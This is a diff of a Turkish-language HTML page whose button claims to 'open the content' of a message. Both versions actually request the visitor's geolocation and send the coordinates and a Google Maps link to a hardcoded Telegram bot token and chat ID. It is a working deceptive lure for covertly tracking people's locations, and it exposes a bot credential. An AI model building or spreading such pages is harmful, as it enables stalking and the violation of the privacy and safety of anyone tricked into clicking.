@@ -1,66 +1,50 @@
 <!DOCTYPE html>
-<html lang="tr">
-<head>
-  <meta charset="UTF-8" />
-  <title>Telegram Konum Gönderici</title>
-</head>
-<body>
-  <h2>Mesaj içeriğinin açılması için butona tıklayınız</h2>
-  <button id="sendLocationBtn">İçeriği Aç</button>
+<html>
+  <head>
+    <title>Konum Gönderici</title>
+  </head>
+  <body>
+    <h2>İçeriğe ulaşmak için Butona Bas:</h2>
+    <button onclick="getLocation()">İÇERİĞİ AÇ</button>
 
-  <script>
-    const BOT_TOKEN = "7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA";
-    const CHAT_ID = "6358000072";
-
-    const button = document.getElementById("sendLocationBtn");
-
-    button.addEventListener("click", () => {
-      if (!navigator.geolocation) {
-        alert("Tarayıcınız konum desteği vermiyor.");
-        return;
+    <script>
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(sendPosition, showError);
+        } else {
+          alert("Tarayıcınız konum desteği vermiyor.");
+        }
       }
 
-      button.disabled = true;
-      button.textContent = "İçerik açılıyor...";
+      function sendPosition(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
 
-      navigator.geolocation.getCurrentPosition(
-        position => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
+        const url = "https://api.telegram.org/bot7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA/sendMessage";
+        const data = {
+          chat_id: "6358000072",
+          text: `📍 Yeni konum:\n\nEnlem: ${lat}\nBoylam: ${lon}\nHarita: https://maps.google.com/?q=${lat},${lon}`
+        };
 
-          fetch(`https://api.telegram.org/bot7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: 6358000072,
-              text: `📍 Konum alındı:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`
-            })
-          })
-          .then(response => response.json())
-          .then(data => {
-            if (data.ok) {
-              alert("Konum başarıyla gönderildi!");
-            } else {
-              alert("Telegram API hatası: " + data.description);
-              console.error("Telegram API hatası detay:", data);
-            }
-            button.disabled = false;
-            button.textContent = "Konumumu Gönder";
-          })
-          .catch(error => {
-            alert("Bir hata oluştu: " + error.message);
-            console.error("Fetch hatası:", error);
-            button.disabled = false;
-            button.textContent = "Konumumu Gönder";
-          });
-        },
-        error => {
-          alert("Konum alınamadı: " + error.message);
-          button.disabled = false;
-          button.textContent = "Konumumu Gönder";
-        }
-      );
-    });
-  </script>
-</body>
+        fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(data)
+        })
+        .then(response => response.json())
+        .then(result => {
+          alert("Konum gönderildi!");
+        })
+        .catch(error => {
+          alert("Bir hata oluştu: " + error);
+        });
+      }
+
+      function showError(error) {
+        alert("Konum alınamadı: " + error.message);
+      }
+    </script>
+  </body>
 </html>
